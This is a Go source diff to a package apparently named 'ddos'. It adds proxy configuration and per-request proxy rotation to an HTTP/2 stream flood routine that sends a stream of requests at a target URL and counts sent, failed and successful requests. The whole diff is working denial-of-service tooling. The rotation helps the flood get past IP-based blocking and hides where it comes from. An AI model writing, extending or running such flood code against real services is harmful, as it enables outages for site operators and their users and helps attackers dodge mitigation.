@@ -3,6 +3,7 @@ package ddos
 import (
 	"io"
 	"net/http"
+	"net/url"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -29,6 +30,14 @@ func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
 	transport, err := d.createHTTP2Transport()
 	if err != nil {
 		return
+	}
+
+	// Configure proxy if enabled
+	if d.config.UseProxy && len(d.config.ProxyList) > 0 && !d.config.RotateProxy {
+		// Use first proxy for all requests
+		if parsedURL, err := url.Parse(d.config.ProxyList[0]); err == nil {
+			transport.Proxy = http.ProxyURL(parsedURL)
+		}
 	}
 
 	client := &http.Client{
@@ -69,6 +78,24 @@ func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL strin
 	atomic.AddInt64(&d.activeConns, 1)
 	defer atomic.AddInt64(&d.activeConns, -1)
 
+	// Create a new client for proxy rotation if needed
+	actualClient := client
+	if d.config.UseProxy && d.config.RotateProxy && len(d.config.ProxyList) > 0 {
+		// Create a new transport with rotated proxy
+		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
+		proxyURL := d.config.ProxyList[int(idx)%len(d.config.ProxyList)]
+		if parsedURL, err := url.Parse(proxyURL); err == nil {
+			transport, err := d.createHTTP2Transport()
+			if err == nil {
+				transport.Proxy = http.ProxyURL(parsedURL)
+				actualClient = &http.Client{
+					Transport: transport,
+					Timeout:   d.config.Timeout,
+				}
+			}
+		}
+	}
+
 	var bodyReader io.Reader
 	if d.config.Body != "" {
 		bodyReader = strings.NewReader(d.config.Body)
@@ -91,7 +118,7 @@ func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL strin
 	startTime := time.Now()
 	atomic.AddInt64(&d.requestsSent, 1)
 
-	resp, err := client.Do(req)
+	resp, err := actualClient.Do(req)
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
 		return
@@ -106,4 +133,3 @@ func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL strin
 	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
 	atomic.AddInt64(&d.requestsSuccess, 1)
 }
-
